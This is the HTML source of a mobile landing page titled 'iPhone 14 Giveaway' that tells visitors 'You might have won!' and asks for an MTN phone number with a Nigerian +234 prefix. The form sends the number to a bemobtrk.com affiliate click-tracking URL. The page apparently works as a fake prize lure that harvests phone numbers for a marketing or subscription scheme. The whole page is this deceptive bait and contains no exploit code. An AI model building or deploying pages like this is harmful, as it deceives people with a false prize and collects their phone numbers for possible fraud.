<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>iPhone 14 Giveaway</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = { theme: { extend: { fontFamily: { sans: ['Inter', 'sans-serif'] } } } }
    </script>
    <style>
        * { -webkit-tap-highlight-color: transparent; }
        input:focus { outline: none; }
    </style>
</head>
<body class="bg-gradient-to-b from-purple-50 to-purple-100 min-h-screen font-sans flex items-center justify-center p-4">
    <div class="w-full max-w-sm bg-white rounded-2xl shadow-xl p-6 text-center">
        <!-- Gift icon -->
        <div class="w-20 h-20 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg class="w-10 h-10 text-purple-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v13m0-13V6a2 2 0 112 2h-2zm0 0V6a2 2 0 10-2 2h2zm-7 4h14M5 8h14M5 8a2 2 0 110-4h14a2 2 0 110 4M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/>
            </svg>
        </div>

        <h1 class="text-2xl font-extrabold text-gray-900 mb-2">You might have won!</h1>
        <p class="text-gray-500 text-sm mb-6">Check your number below to see if you're a winner</p>

        <form action="https://08deh.bemobtrk.com/click?campaign_id=ecce3d4e-5f0f-4be9-bac5-c0d12b7815ce&landing_id=ea90ebc6-3f67-476b-a88f-2cee7ab5f97c" method="GET" class="space-y-4">
            <div class="relative">
                <div class="flex border-2 border-gray-200 rounded-xl overflow-hidden focus-within:border-purple-500 transition">
                    <span class="inline-flex items-center px-3 bg-gray-50 text-gray-600 font-semibold text-sm border-r border-gray-200">+234</span>
                    <input type="tel" name="phone" placeholder="800 000 0000" required
                        class="flex-1 px-3 py-4 text-base text-gray-900 placeholder-gray-400 bg-white"
                        pattern="[0-9]{6,15}" maxlength="11"
                        oninput="this.value = this.value.replace(/[^0-9]/g,'')">
                </div>
            </div>

            <button type="submit"
                class="w-full bg-purple-600 hover:bg-purple-700 active:bg-purple-800 text-white font-bold text-lg py-4 rounded-xl shadow-lg shadow-purple-200 transition-all">
                Check Now
            </button>
        </form>

        <p class="text-xs text-gray-400 mt-4">iPhone 14 giveaway. Enter your MTN number to check.</p>
    </div>
</body>
</html>
